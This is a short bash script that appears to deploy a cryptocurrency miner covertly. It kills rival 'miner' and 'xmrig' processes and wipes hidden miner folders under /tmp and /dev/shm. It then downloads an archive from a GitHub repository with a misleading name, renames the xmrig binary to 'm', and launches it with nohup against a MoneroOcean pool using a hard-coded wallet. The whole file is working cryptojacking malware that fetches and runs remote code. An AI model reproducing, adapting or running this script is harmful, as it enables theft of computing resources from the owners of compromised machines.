#!/bin/bash
# Terminate all existing miner/xmrig processes
pkill -9 -f 'miner' 2>/dev/null || true
pkill -9 -f 'xmrig' 2>/dev/null || true

# Clean hidden miner locations
rm -rf /tmp/.x/m 2>/dev/null
pkill -9 -f '/tmp/.x/m' 2>/dev/null || true
rm -rf /dev/shm/.x/m 2>/dev/null
pkill -9 -f '/dev/shm/.x/m' 2>/dev/null || true

# Main installation and launch
wget https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip && \
unzip main.zip && \
cd hwloc-without-main && \
chmod +x xmrig && \
mv xmrig m && \
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p worker1 --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
